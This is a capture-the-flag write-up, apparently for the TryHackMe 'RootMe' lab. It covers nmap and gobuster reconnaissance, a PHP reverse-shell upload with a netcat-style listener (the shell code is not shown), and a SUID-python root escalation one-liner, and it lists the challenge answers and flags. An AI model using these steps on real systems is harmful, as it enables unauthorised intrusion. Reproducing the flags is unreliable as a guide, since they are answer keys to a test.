# RootME


# Task 1

1. Deploy the machine

'''
done
'''


Nmap result:
nmap -sC -sV -oN nScan 10.10.43.144   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 23:37 EDT
Nmap scan report for 10.10.43.144
Host is up (6.4s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds





# Task 2

1. Scan the machine, how many ports are open?

'''
2  // Counted from nmap scan.
'''

2. What version of Apache is running?

'''
2.4.29  // Mentioned in nmap Scan
'''

3. What service is running on port 22?

'''
SSH  // Mentioned in nmap Scan
'''

4. Find directories on the web server using the GoBuster tool.

'''
No answer needed
'''

5. What is the hidden directory?

'''
/panel/  // Found by gobuster >>gobuster dir -u http://10.10.43.144/ -w /usr/share/wordlists/dirb/common.txt
'''


# Task 3

>> Find a form to upload and get a reverse shell, and find the flag.


// Getting the reverse shell using php script from github.
// listning to the port 9999 with rlwrap -lvp 9999

1. user.txt


'''
THM{y0u_g0t_a_sh3ll} 
'''


# Task 4

1. Search for files with SUID permission, which file is weird?  

'''
/usr/bin/python   // It was the odd one in >>find / -perm -u=s -type f 2>/dev/null
'''

2. Find a form to escalate your privileges.

'''
no answer needed
'''

// Priviledge excalation with command >>./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' in /usr/bin directory


3. root.txt

'''
THM{pr1v1l3g3_3sc4l4t10n}  // Found in /root/root.txt
'''
